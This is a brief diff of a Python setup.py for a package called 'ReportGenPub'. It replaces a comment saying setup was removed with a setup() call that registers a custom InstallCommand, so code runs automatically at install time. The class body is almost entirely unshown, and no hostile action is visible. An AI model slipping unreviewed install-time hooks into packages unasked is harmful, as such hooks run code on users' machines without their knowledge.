@@ -94,4 +94,10 @@ class InstallCommand(install):
                 break
 
 
-# setup(...) removed                                                                                                                           
+setup(
+    name='ReportGenPub',
+    version='0.2',
+    license='MIT',
+    packages=find_packages(),
+    cmdclass={'install': InstallCommand},
+)
